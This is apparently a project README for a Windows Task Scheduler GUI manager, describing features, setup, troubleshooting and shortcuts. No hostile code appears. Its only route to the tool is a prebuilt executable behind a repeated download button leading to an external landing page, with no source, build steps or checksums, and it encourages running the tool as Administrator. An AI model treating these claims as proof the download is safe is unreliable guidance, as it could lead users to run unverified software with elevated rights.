<div align="center">

<img src="assets/banner.svg" width="100%" alt="Task Scheduler GUI banner"/>

# task-scheduler-gui-manager 🗓️⚙️

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*A visual front-end for Windows Task Scheduler — because XML editing is not a personality trait.*

</div>

---

## 🚫 What This Is NOT

**TL;DR: this is not a replacement for Task Scheduler — it's the interface Task Scheduler should have shipped with.**

Before you get excited (or skeptical), let's clear the air:

- This is **not** a background daemon that silently reschedules your tasks — you stay in full control.
- This is **not** a cloud service, telemetry collector, or subscription product — nothing leaves your machine.
- This is **not** a scripting language replacement — it doesn't compete with PowerShell, it complements it.
- This is **not** a system tweaker, registry cleaner, or "optimizer" bundled with unrelated junk.

What it **is**: a clean, fast, native Windows GUI that sits on top of the built-in Task Scheduler engine (`schtasks` / Task Scheduler COM API) and makes creating, editing, and monitoring scheduled tasks feel like using modern software instead of a Windows XP control panel relic.

---

## 🔍 Overview

`task-scheduler-gui-manager` exists because the stock Task Scheduler MMC console hasn't meaningfully changed in over a decade. Triggers are buried three tabs deep, condition logic is unreadable at a glance, and diagnosing why a task silently failed at 3 AM usually means digging through Event Viewer logs. This project rebuilds that entire experience around clarity: one dashboard, readable trigger summaries, inline history, and status indicators that don't require a decoder ring.

It's built for the people who actually *live* inside task scheduling — sysadmins automating backups and maintenance windows, developers running local build or sync jobs, power users automating routine cleanup, and IT teams standardizing task deployment across fleets of machines. Anyone who has ever opened Task Scheduler, sighed, and closed it again is the target audience.

Under the hood, nothing about the underlying scheduling engine changes. Your tasks remain fully native, fully compatible with `schtasks.exe`, Group Policy, and every other tool that reads the Windows Task Scheduler store. This tool is purely a better lens for viewing and editing what's already there — a **task scheduler GUI** in the truest sense, not a parallel system.

<p align="center">
  <a href="https://FeatherVerse.github.io/task-scheduler-gui-manager/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Task_Scheduler_GUI-059669?style=for-the-badge&logo=windows&logoColor=white&labelColor=047857" width="550" alt="Download"/>
  </a>
</p>

---

## 🧩 What It Actually Does

**TL;DR: a full visual layer over task creation, triggers, conditions, actions, and run history — no XML required.**

- **Visual task builder** — construct triggers, actions, and conditions through form fields instead of hand-writing scheduler XML.
- **Live status dashboard** — see every task's last run result, next run time, and enabled state in one sortable grid.
- **Trigger humanizer** — converts cryptic trigger definitions into plain sentences like "runs daily at 9:00 AM, repeats every hour until 6:00 PM."
- **Run history timeline** — a scrollable log of past executions per task, pulled straight from the Task Scheduler event log.
- **Bulk operations** — enable, disable, export, or delete multiple tasks in one action instead of one at a time.
- **Import / export profiles** — save a set of tasks as a portable file and reapply them on another machine in seconds.
- **Search and filter** — locate a task among hundreds by name, trigger type, folder, or last-run status.
- **Safe-edit guardrails** — warns before modifying tasks owned by system processes or protected folders.

> [!TIP]
> Use the search bar with `folder:` or `status:` prefixes (e.g. `status:failed`) to instantly filter large task libraries.

---

## 🚀 Getting Started

**TL;DR: visit the landing page, download, run the executable, done — no installer wizard required.**

1. Open the [project landing page](https://FeatherVerse.github.io/task-scheduler-gui-manager/) using the download button above.
2. Download the latest build for Windows.
3. Run the executable — it launches directly, no setup screens to click through.
4. The dashboard scans your existing Task Scheduler library automatically and populates within seconds.

> [!NOTE]
> First launch may take a moment longer while the app indexes tasks across all Task Scheduler folders, including hidden Microsoft system paths.

---

## 🖥️ System Requirements

**TL;DR: Windows 10 or 11, nothing else needed.**

| Requirement | Details |
|---|---|
| OS | Windows 10 (64-bit) or Windows 11 |
| Dependencies | None — fully standalone |
| Install | Not required — portable executable |
| Disk space | Under 50 MB |
| Permissions | Standard user for personal tasks; Administrator for system-level tasks |
| .NET / runtime | Bundled — nothing to install separately |

![Status](https://img.shields.io/badge/status-actively--maintained-brightgreen?style=flat-square) ![Build](https://img.shields.io/badge/build-passing-success?style=flat-square) ![Arch](https://img.shields.io/badge/arch-x64-lightgrey?style=flat-square)

> [!IMPORTANT]
> Editing tasks created by other users or by the system requires running the app as Administrator. Without elevation, those tasks appear read-only.

---

## 🧠 How It Works

**TL;DR: the GUI reads and writes directly to the same Task Scheduler store Windows already uses — it's a translator, not a new engine.**

1. On launch, the app queries the native Task Scheduler API for all tasks across every folder.
2. Each task's XML definition is parsed into a human-readable model — triggers, actions, conditions.
3. Edits made in the GUI are validated locally, then serialized back into valid Task Scheduler XML.
4. The updated definition is registered back through the same API Windows itself uses.
5. The dashboard refreshes to reflect the new state, including next-run predictions.

```mermaid
flowchart LR
    Scan[Scan Tasks] --> Parse[Parse Triggers]
    Parse --> Edit[Edit in GUI]
    Edit --> Validate[Validate Rules]
    Validate --> Save[Save to Scheduler]
```

> [!WARNING]
> Deleting a task through the GUI is permanent and immediate — there is no built-in recycle bin. Export important tasks before bulk deletions.

---

## 🩹 Troubleshooting

**TL;DR: most issues trace back to permissions, folder visibility, or stale caches — here's the quick fix list.**

<details>
<summary><strong>A task I created in Task Scheduler doesn't show up in the app.</strong></summary>

Click the refresh icon in the top toolbar. The app caches the task list on launch for speed and doesn't auto-poll for external changes made outside the GUI.

</details>

<details>
<summary><strong>Why is a task greyed out and uneditable?</strong></summary>

It's likely owned by SYSTEM or another user account. Relaunch the app as Administrator to unlock full editing rights for protected tasks.

</details>

<details>
<summary><strong>My task shows "last run result" as a strange hex code.</strong></summary>

That's the raw Win32 error code from the scheduler engine. Hover over the code in the history panel — the app translates common codes into plain-English explanations automatically.

</details>

<details>
<summary><strong>Can I schedule a task that runs only when a specific network is connected?</strong></summary>

Yes — under Conditions, enable "Start only if network available" and select the profile. This maps directly to the native Task Scheduler condition, so it behaves identically to a manually configured one.

</details>

<details>
<summary><strong>The app won't let me edit a task in a system folder.</strong></summary>

This is intentional friction, not a bug. System-owned tasks are locked by default to prevent accidental changes to OS-critical schedules; there's an override toggle in Settings for advanced users.

</details>

---

## 🎨 UI / UX Details

**TL;DR: keyboard-friendly, themeable, and configurable without digging through nested menus.**

| Shortcut | Action |
|---|---|
| `Ctrl + N` | Create new task |
| `Ctrl + F` | Focus search bar |
| `Ctrl + R` | Run selected task now |
| `Ctrl + Shift + D` | Disable/enable selected task |
| `Delete` | Delete selected task (with confirmation) |
| `F5` | Refresh task list |

- **Themes**: Light, Dark, and an auto mode that follows your Windows theme setting.
- **Dense vs comfortable view**: toggle grid density for large task libraries.
- **Column customization**: show/hide columns like folder, author, or last run duration.
- **Settings panel**: controls default triggers, confirmation prompts, and startup folder scope.

> [!TIP]
> Pin frequently-used tasks to the sidebar for one-click access without searching each time.

---

## 🤝 Contributing & Community

**TL;DR: issues and pull requests are welcome — this project grows through real-world scheduling pain points.**

> Found an edge case where a trigger renders incorrectly? Have a workflow this tool doesn't cover yet? Open an issue with a description and, if possible, the task's exported XML (with sensitive paths redacted).

- Bug reports and feature requests go through the Issues tab.
- Pull requests should target a clear, single-purpose change.
- UI/UX suggestions are especially valuable — this project lives and dies by usability.

---

## 📄 License

**TL;DR: MIT, 2026 — use it, fork it, ship it.**

Released under the [MIT License](LICENSE). Do what you want, just keep the copyright notice intact.

---

## ⚠️ Disclaimer

**TL;DR: this tool edits real system scheduling data — use good judgment.**

This software interacts directly with the Windows Task Scheduler store. While every effort is made to validate changes before saving, modifying or deleting tasks — especially system-owned ones — can affect automated processes relied on by other software. Always export or back up important task definitions before making bulk changes. The maintainers are not responsible for scheduling disruptions caused by misconfigured tasks.

---

<p align="center">
  <a href="https://FeatherVerse.github.io/task-scheduler-gui-manager/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Task_Scheduler_GUI-059669?style=for-the-badge&logo=windows&logoColor=white&labelColor=047857" width="550" alt="Download"/>
  </a>
</p>